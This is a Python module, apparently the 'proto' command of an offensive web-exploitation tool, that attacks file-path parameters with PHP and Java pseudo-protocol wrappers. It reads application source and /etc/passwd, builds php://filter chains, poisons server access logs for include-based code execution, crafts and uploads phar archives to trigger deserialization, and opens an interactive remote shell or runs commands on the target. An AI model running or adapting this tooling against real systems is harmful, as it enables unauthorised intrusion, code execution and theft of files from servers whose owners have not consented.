"""Pseudo-protocol wrappers: what a path parameter accepts, and what it gives back.

    python injectorkit.py proto -u "http://target/?file=index.php"
    python injectorkit.py proto -u "http://target/?file=x" --param file --oob 10.0.0.5:8081

A parameter that takes a filename is a dispatch point. Which wrapper it accepts
says which runtime sits behind it, and what that runtime will hand over: a source
file through a filter chain, an archive's contents, a module inside the JDK, or a
fetch it was never meant to make. The probes are the question; the graph decides
what the answer means.
"""

from __future__ import annotations

import argparse
from ...core import phar
from ...core.httpmsg import parse_headers
from ...engine.arithmetic import Arithmetic
from ...engine.bypass import Bypass
from ...engine.evidence import Judge
from ...engine.runner import (
    baseline_body,
    choose_target,
    close_board,
    close_filters,
    collect_targets,
    emit_summary,
    no_parameters_message,
    open_board,
    open_filters,
    run_targets,
    select_params,
)
from ...engine.shell import run as run_shell_loop
from ...engine.shell import run_once
from ...engine.statemachine import Engine, RunContext
from . import mutators as _mutators  # noqa: F401  (registers this module's mutators)
from .graph import build_graph
from .seeds import LIKELY_PARAMS
from .shell import FilterChainShell, LogPoisonShell

NAME = "proto"
HELP = (
    "pseudo-protocol wrappers: php://filter, data://, expect://, phar://, zip://, "
    "compress.*, jar:, jrt:, netdoc://, ldap:// and the rest of what a path parameter accepts"
)


def add_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("-u", "--url", help="target URL, including the parameter to attack")
    parser.add_argument("-r", "--request", help="a raw HTTP request captured from a proxy")
    parser.add_argument("--param", help="parameter to inject into (default: pick the likely ones)")
    parser.add_argument("--max-params", type=int, default=6, help="how many parameters to try")
    parser.add_argument(
        "--read",
        action="append",
        metavar="FILE",
        help="a file worth reading (repeatable). Default: the application's own source first, "
        "then /etc/passwd - a PHP filter wants the former and a Java file reader cannot see it",
    )
    parser.add_argument(
        "--upload",
        metavar="PATH",
        help="a path already on the target that holds an uploaded file; enables zip:// and phar://, "
        "and a phar is the usual way to reach deserialization from a file read",
    )
    parser.add_argument(
        "--via",
        action="append",
        metavar="URL",
        help="route every payload through a host the target trusts, with {target} standing for the "
        "real value, e.g. 'http://allowed/redirect?to={target}'",
    )
    exploit = parser.add_argument_group(
        "exploitation",
        "Off by default. Without these the run only reports what it proved: that the "
        "parameter accepts a wrapper, that a value came back, that a file was read.",
    )
    exploit.add_argument(
        "--exploit",
        action="store_true",
        help="go further than the finding, on the tool's own initiative: build a php://filter "
        "chain and send it, and report whether it runs. It runs a marker, not a command - for "
        "a command of your own, say so with --os-cmd or --os-shell, which do not need this "
        "flag",
    )
    exploit.add_argument(
        "--make-phar",
        metavar="FILE",
        help="write a phar here and exit, with its metadata built from --phar-class and "
        "--phar-set. Upload it yourself, then point --upload at where it landed: the archive "
        "is the payload, and PHP unserializes the metadata when the target asks for it",
    )
    exploit.add_argument(
        "--webroot",
        metavar="DIR",
        help="a directory the target serves from, when it is known. An archive gadget writes "
        "files into one, and it is worked out from the target's own configuration where "
        "possible - this overrides that when the operator knows better",
    )
    exploit.add_argument(
        "--upload-to",
        metavar="URL",
        help="an upload endpoint to send the archive to, so the chain runs end to end: build, "
        "upload, point the target at it, read the result back. Without it the archive has to "
        "already be on the target and --upload names where",
    )
    exploit.add_argument(
        "--upload-field",
        metavar="NAME",
        default="file",
        help="the form field the upload endpoint expects the file in (default: file)",
    )
    exploit.add_argument(
        "--phar-class",
        metavar="CLASS",
        help="the class the metadata is built as, e.g. one the target's framework autoloads",
    )
    exploit.add_argument(
        "--phar-set",
        action="append",
        metavar="NAME=VALUE",
        default=[],
        help="a property to set on that class (repeatable)",
    )
    exploit.add_argument(
        "--log-path",
        metavar="PATH",
        help="run commands by planting PHP in a log the target writes, then including it. Needs "
        "one of --os-cmd or --os-shell. This is the route that still works when "
        "every wrapper is refused, because a plain path reaches include() where php://filter "
        "does not. Point it at the server's access log, e.g. /var/log/nginx/access.log; the "
        "application must be able to read it, and it must be small enough to include whole",
    )
    exploit.add_argument(
        "--os-shell",
        action="store_true",
        help="open a live shell on the target: type commands, read their output, 'exit' to leave. "
        "The chain is built once and a short reader takes each command "
        "from a second parameter, so a session costs one long request per command",
    )
    exploit.add_argument(
        "--os-cmd",
        metavar="COMMAND",
        help="run one command and print its output, then exit. It appears with the results, "
        "under Commands run:",
    )


def write_phar(args, runtime) -> int:
    """Build the archive and stop. Uploading it is the operator's business.

    The class and its properties come from the command line because they come
    from the target's own code: which class a metadata blob should be built as is
    the one part of this that cannot be guessed from out here.
    """
    if not args.phar_class:
        raise SystemExit("--make-phar needs --phar-class: the class the metadata is built as")

    from .deserialize import Gadget, build_archive

    # The same builder the exploit chain uses, so a gadget that works offline
    # works in a run and the other way round. Building it twice would be two
    # things to keep in step.
    gadget = Gadget(class_name=args.phar_class, properties=phar_config(args)["phar_set"])
    blob = build_archive(gadget, {})
    try:
        with open(args.make_phar, "wb") as handle:
            handle.write(blob)
    except OSError as error:
        raise SystemExit(f"could not write {args.make_phar}: {error}")

    runtime.emit(f"[+] wrote {len(blob)} bytes to {args.make_phar}")
    runtime.emit(f"    metadata: {phar.php_object(args.phar_class, gadget.properties).decode('utf-8', 'replace')}")
    runtime.emit("    upload it yourself, or pass --upload-to to have a run do it end to end")
    return 0


def run(args: argparse.Namespace, runtime) -> int:
    if getattr(args, "make_phar", None):
        return write_phar(args, runtime)
    wants_shell = (
        getattr(args, "os_shell", False)
        or getattr(args, "os_cmd", None)
        or getattr(args, "log_path", None)
    )
    if wants_shell:
        # `--os-shell`, `--os-cmd` and `--log-path` are the request. The command
        # is in the argv, so there is nothing left for a second switch to
        # confirm: asking for a command to run and then being told to ask again
        # is how a tool ends up doubting the operator twice over one decision.
        #
        # `--exploit` is a different thing and stays: it is the tool deciding for
        # itself to go further than the finding - build a chain, send it, see
        # whether it runs - which is exactly the decision that should be opt-in.
        return run_shell(args, runtime)
    return run_targets(args, runtime, NAME, LIKELY_PARAMS, run_one)


def run_shell(args: argparse.Namespace, runtime) -> int:
    """A live session instead of a scan.

    The graph answers "what will this parameter accept"; a shell answers "run
    this and show me". They share the request, the parameter and the board, but
    there is nothing to decide per command, so the state machine stays out of it.
    """
    targets = collect_targets(args, runtime, NAME)
    extra_headers = frozenset(
        name.lower() for name, _ in parse_headers(getattr(args, "header", None) or [])
    )
    request, params, index = choose_target(
        targets, args.param, args.max_params, LIKELY_PARAMS, extra_headers
    )
    if not params:
        raise SystemExit(
            no_parameters_message(targets, args.max_params, LIKELY_PARAMS, extra_headers)
        )
    if index > 1:
        runtime.info(f"target {index} of {len(targets)} is the one with a parameter")

    board = open_board(args, runtime, request)
    body, spread, steady = baseline_body(runtime.transport, request, board.count_request)
    if not steady:
        runtime.warn(
            "the page answers two identical requests differently, so a change in it "
            "cannot be told apart from its own noise"
        )
    context = RunContext(
        graph=build_graph(NAME),
        transport=runtime.transport,
        blackboard=board,
        judge=Judge(
            baseline=body,
            baseline_spread=spread,
            on_echo=lambda: runtime.warn(
                "the page reflects the parameter value back; every payload changes the "
                "response, so the reflection is filtered out before matching"
            ),
        ),
        bypass=open_filters(args, runtime, request, board),
        oob=runtime.oob,
        pheromone=runtime.pheromone,
        config={
            "request": request,
            "params": params,
            "oob_wait": args.oob_wait,
            "traceback": args.verbose > 1,
            "via": args.via or [],
            "read": args.read or [],
            "upload": args.upload or "",
            "exploit": True,
            **phar_config(args),
        },
        log=runtime.log,
        emit=runtime.emit,
        info=runtime.info,
        max_requests=args.max_requests,
    )

    # Two ways to run a command through an include() point, and which applies is
    # decided by the target rather than by preference. The filter chain
    # manufactures its payload in the stream, which needs the application to
    # accept `php://filter`; planting code in the access log needs nothing but a
    # plain path, which is what a target that refuses every wrapper still allows.
    if args.log_path:
        execute = LogPoisonShell(context, params[0], args.log_path)
        where = f"log poisoning through {args.log_path}"
        why = (
            "the planted code did not run: the marker never came back. The log may not be "
            "includable, or it may be rotated, or the request may not reach the line it writes"
        )
    else:
        execute = FilterChainShell(context, params[0])
        where = f"filter chain over {params[0].key()}"
        why = (
            "the filter chain did not run on this target: the page answered, but without the "
            "marker a working chain prints. The application may be refusing php://filter, or "
            "the request may be arriving truncated"
        )

    try:
        # Ask for something only a working chain could print, and ask for a
        # number: the payload carries an addition and the response has to carry
        # its result. A page echoing the payload back returns `2+3`, not `5`, so
        # this cannot be satisfied by an application that never executed
        # anything - which a marker the payload itself contains can be.
        check = Arithmetic()
        answer = check.proved(execute(check.command()))
        if answer is None:
            runtime.warn(why)
            return 1
        runtime.info(f"   the shell answered its arithmetic check ({answer})")

        if args.os_cmd:
            # One command is a result, so it is shown with the results at the end
            # - the same place a file that was read is shown, and the same shape
            # the other two classes print. A session is different: its output has
            # to appear as it happens, so that one prints inline.
            text = execute(args.os_cmd)
            board.remember_run(args.os_cmd, text)
            return 0
        return run_shell_loop(
            execute,
            prompt=runtime.paint("os-shell> ", "next"),
            banner=runtime.paint(f"{where} on {request.host()}", "section"),
        )
    finally:
        # This path shares the board with the scan, and the board carries what an
        # earlier scan did not cover. This run is not that scan - the state machine
        # stays out of it - so nothing here re-derives those entries, and the one
        # saying execution was "not requested; pass --exploit" is false by
        # construction: reaching this path means --os-cmd, --os-shell or
        # --log-path was given. Dropped rather than printed underneath the command
        # it just ran.
        board.forget_not_covered("exploit.filter_chain")
        # A shell is the place an interrupt is most likely, and what was learned
        # about the filter on the way in is what the next attempt wants.
        emit_summary(runtime, board, args)
        close_board(args, board, request)
        close_filters(args, context.bypass, request)


def phar_config(args) -> dict:
    """The gadget and the upload endpoint, as the deserialization action wants them.

    `--phar-set` arrives as a list of `NAME=VALUE` and is turned into the mapping
    the gadget builder needs. Parsed here rather than inside the action so a
    malformed pair is reported once, at startup, instead of in the middle of a
    chain that has already spent requests.
    """
    properties: dict[str, str] = {}
    for pair in getattr(args, "phar_set", None) or []:
        name, found, value = pair.partition("=")
        if not found or not name:
            raise SystemExit(f"--phar-set expects NAME=VALUE, got {pair!r}")
        properties[name] = value
    return {
        "phar_class": getattr(args, "phar_class", None) or "",
        "phar_set": properties,
        "upload_to": getattr(args, "upload_to", None) or "",
        "upload_field": getattr(args, "upload_field", None) or "file",
        "webroot": getattr(args, "webroot", None) or "",
    }


def run_one(request, params, args: argparse.Namespace, runtime) -> None:
    board = open_board(args, runtime, request)
    body, spread, steady = baseline_body(runtime.transport, request, board.count_request)
    if not steady:
        runtime.warn(
            "the page answers two identical requests differently, so a change in it "
            "cannot be told apart from its own noise"
        )
    context = RunContext(
        graph=build_graph(NAME),
        transport=runtime.transport,
        blackboard=board,
        judge=Judge(
            baseline=body,
            baseline_spread=spread,
            on_echo=lambda: runtime.warn(
                "the page reflects the parameter value back; every payload changes the "
                "response, so the reflection is filtered out before matching"
            ),
        ),
        bypass=open_filters(args, runtime, request, board),
        oob=runtime.oob,
        pheromone=runtime.pheromone,
        config={
            "request": request,
            "params": params,
            "oob_wait": args.oob_wait,
            "traceback": args.verbose > 1,
            "via": args.via or [],
            "read": args.read or [],
            "upload": args.upload or "",
            "exploit": args.exploit,
            **phar_config(args),
        },
        log=runtime.log,
        emit=runtime.emit,
        info=runtime.info,
        max_requests=args.max_requests,
    )

    try:
        Engine(context.graph, context).run()
    finally:
        # Written even when the run is interrupted: what was learned before a
        # Ctrl+C is exactly what a resumed run needs.
        emit_summary(runtime, board, args)
        close_board(args, board, request)
        close_filters(args, context.bypass, request)
